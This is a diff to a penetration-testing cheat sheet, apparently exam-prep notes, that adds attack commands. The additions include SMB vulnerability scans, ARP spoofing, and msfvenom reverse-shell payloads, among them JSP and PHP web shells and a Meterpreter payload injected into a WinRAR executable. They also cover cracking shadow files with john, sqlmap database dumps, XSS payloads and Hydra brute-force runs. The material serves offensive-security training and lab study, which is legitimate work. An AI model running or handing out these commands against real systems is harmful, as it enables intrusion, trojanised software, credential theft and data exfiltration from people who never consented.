@@ -173,6 +173,9 @@ sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
 ping <TARGET_IP>
 sudo nmap -sn <TARGET_IP/NETWORK>
 
+tracert    google.com     #Windows 
+traceroute google.com     #Linux
+
 ## fping
 fping -I eth1 -g <TARGET_IP/NETWORK> -a
 ## fping with no "Host Unreachable errors"
@@ -211,6 +214,8 @@ nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassw
 nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
 
 nmap -p 445 --script smb-os-discovery <TARGET_IP>
+
+nmap -p445 --script=smb-vuln-* <TARGET_IP>
 ```
 
 #### Nmblookup
@@ -247,6 +252,7 @@ smbclient //<TARGET_IP>/<USER> -U <USER>
 smbclient //<TARGET_IP>/admin -U admin
 smbclient //<TARGET_IP>/public -N
 ## SMBCLIENT
+smbclient //<TARGET_IP>/share_name
 help
 ls
 get <filename>
@@ -272,6 +278,7 @@ enum4linux -G <TARGET_IP>
 enum4linux -i <TARGET_IP>
 enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
 enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
+enum4linux -U -M -S -P -G 10.10.10.10 <TARGET_IP>
 ```
 
 #### Hydra
@@ -320,7 +327,9 @@ nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
 ```bash
 ftp <TARGET_IP>
 ls
+cd /../..
 get <filename>
+put <filename>
 ```
 
 #### Hydra
@@ -1124,7 +1133,7 @@ tshark -r <FILE>.pcap -Y "wlan.ta==<DEVICE_MAC> && http" -Tfields -e http.user_a
 
 ## Forward IP packets
 echo 1 > /proc/sys/net/ipv4/ip_forward
-
+# arpspoof -i <interface> -t <target> -r <host>
 arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP>
 ```
 
@@ -1402,8 +1411,9 @@ use auxiliary/scanner/http/http_put
 
 ### Payloads
 
+#### MSFVenom shells
+
 ```bash
-# MSFVENOM
 msfvenom --list payloads
 msfvenom --list formats
 msfvenom --list encoders
@@ -1431,7 +1441,16 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL
 
 # Inject into Portable Executables
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe
+
+# JSP Java Meterpreter Reverse TCP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 
+
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\                   #PHP Web Application
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
+
+#### **MSF Staged and Non Staged Payload**
 
 ```bash
 # MSF STAGED Payload
@@ -2695,8 +2714,12 @@ john --list=formats | grep NT
 john --format=NT hashes.txt
 
 gzip -d /usr/share/wordlists/rockyou.txt.gz
+john <Hash_Password-File> --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
 john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
+#this is another way to crack passwords (that requires shadow file with passwd file)
+unshadow passwd shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
 hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
@@ -2841,23 +2864,53 @@ nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 
 
 ### Attacks
 
+### SQLMap
+
+#### Check if injection exists
+
 ```bash
-# SQLMap
+sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
+sqlmap -r Post.req
+
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
-sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
+```
 
-## List databases
+#### **Get database if injection Exists**
+
+```bash
+sqlmap -r login.req --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
+
+# List databases
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
-
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables
-
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns
-
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
+```
 
+**Get Tables in a Database**
 
-# XSSer
+```bash
+sqlmap -r login.req -D dbname --tables 
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
+```
+
+**Get data in a Database tables**
+
+```bash
+sqlmap -r login.req -D dbname -T table_name --dump
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
+```
+
+**XSSer**
+
+```bash
 xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
 
@@ -2870,8 +2923,11 @@ xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=
 
 ## Authenticated XSSer
 xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"
+```
 
+#### Hydra
 
-# Hydra - Basic auth attacks (brute-force)
+```
+# Basic auth attacks (brute-force)
 hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 ```
